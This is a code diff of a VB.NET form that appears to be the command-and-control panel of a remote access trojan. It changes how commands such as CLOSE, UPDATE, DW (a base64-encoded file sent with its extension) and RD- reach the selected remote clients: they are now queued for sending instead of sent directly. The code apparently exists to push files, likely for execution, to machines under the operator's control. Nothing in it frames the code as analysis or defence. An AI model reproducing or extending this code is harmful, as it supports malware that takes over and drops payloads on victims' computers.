@@ -32,9 +32,11 @@ Public Class Form1
             Try
                 Dim B As Byte() = SB("CLOSE")
                 For Each C As ListViewItem In LV1.SelectedItems
-                    Dim x As Client = CType(C.Tag, Client)
+                    '   Dim x As Client = CType(C.Tag, Client)
                     Try
-                        x.Send(B)
+                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                        Pending.Req_Out.Add(ClientReq)
+                        '  x.Send(B)
                     Catch ex As Exception
                     End Try
                 Next
@@ -57,10 +59,9 @@ Public Class Form1
                     Dim B As Byte() = SB("UPDATE" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
 
                     For Each C As ListViewItem In LV1.SelectedItems
-                        Dim x As Client = CType(C.Tag, Client)
-
                         Try
-                            x.Send(B)
+                            Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                            Pending.Req_Out.Add(ClientReq)
                         Catch ex As Exception
                         End Try
                     Next
@@ -84,10 +85,9 @@ Public Class Form1
                     Dim B As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(o.FileName) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
 
                     For Each C As ListViewItem In LV1.SelectedItems
-                        Dim x As Client = CType(C.Tag, Client)
-
                         Try
-                            x.Send(B)
+                            Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                            Pending.Req_Out.Add(ClientReq)
                         Catch ex As Exception
                         End Try
                     Next
@@ -103,10 +103,11 @@ Public Class Form1
 
 
                 Dim B As Byte() = SB("RD-")
+
                 For Each C As ListViewItem In LV1.SelectedItems
-                    Dim x As Client = CType(C.Tag, Client)
                     Try
-                        x.Send(B)
+                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                        Pending.Req_Out.Add(ClientReq)
                     Catch ex As Exception
                     End Try
                 Next
@@ -132,9 +133,9 @@ Public Class Form1
 
                 Dim B As Byte() = SB("PING!")
                 For Each C As ListViewItem In LV1.Items
-                    Dim x As Client = CType(C.Tag, Client)
                     Try
-                        x.Send(B)
+                        Dim ClientReq As New Outcoming_Requests(C.Tag, B)
+                        Pending.Req_Out.Add(ClientReq)
                     Catch ex As Exception
                     End Try
                 Next
